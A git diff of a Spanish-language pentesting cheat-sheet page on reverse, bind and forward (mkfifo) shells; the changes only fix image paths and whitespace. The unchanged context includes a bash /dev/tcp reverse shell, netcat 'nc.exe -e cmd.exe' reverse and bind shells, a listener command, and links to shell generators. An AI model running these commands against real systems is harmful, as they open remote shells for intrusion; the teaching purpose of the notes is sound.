@@ -4,7 +4,7 @@
 
 ### Reverse Shell
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>
 
 #### Atacante Linux
 
@@ -17,7 +17,7 @@ nc -lvnp <Port>
 Donde:
 
 * `-l` : Modo escucha
-* `-v` : Modo verbose (Retorna Información de la conexión, se puede usar -vvv para mas información en la conexión).&#x20;
+* `-v` : Modo verbose (Retorna Información de la conexión, se puede usar -vvv para mas información en la conexión).
 * `-n` : Deshabilitar resolución inversa de DNS
 * `-p <Port>` : Establece el puerto de escucha
 
@@ -36,13 +36,11 @@ bash -i >& /dev/tcp/<IP>/<Port> 0>&1
 nc.exe –e cmd.exe <IP> <Port>
 ```
 
-
-
 ### Bind Shell
 
 En algunos proyectos donde no puedas establecer un servidor de escucha por que te encuentres por NAT o por Firewall, a veces es conveniente de que la máquina victima esté en modo escucha ofreciendo la shell, a esto se le llama <mark style="color:green;">**Bind shell**</mark> o <mark style="color:green;">**shell directa.**</mark>
 
-<figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>
 
 #### Atacante Linux
 
@@ -70,21 +68,15 @@ nc.exe -l -p <Port> -e cmd.exe
 
 Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.
 
+Puedes encontrar casos en los que tienes un RCE (Remote Code Execution) en una aplicación web en una máquina Linux pero debido a reglas Iptables u otro tipo de filtrado no puedes obtener una shell inversa.
 
-
-Puedes encontrar casos en los que tienes un RCE (Remote Code Execution) en una aplicación web en una máquina Linux pero debido a reglas Iptables u otro tipo de filtrado no puedes obtener una shell inversa.&#x20;
-
-Esta técnica o tipo de "shell" te permite mantener un shell PTY a través de ese RCE usando tuberías dentro del sistema víctima.&#x20;
+Esta técnica o tipo de "shell" te permite mantener un shell PTY a través de ese RCE usando tuberías dentro del sistema víctima.
 
 {% embed url="https://github.com/IppSec/forward-shell" %}
 
 Sólo necesitas modificar La URL del host vulnerable El prefijo y sufijo de tu payload (si lo hay) La forma en que se envía el payload (¿encabezados? ¿datos? ¿información extra?) Luego, sólo tienes que enviar comandos o incluso utilizar el comando upgrade para obtener un PTY completo (ten en cuenta que las tuberías se leen y escriben con un retardo aproximado de 1,3s).
 
-
-
 ## Referencias
-
-
 
 {% embed url="https://www.revshells.com/" %}
 Generador de Revershells
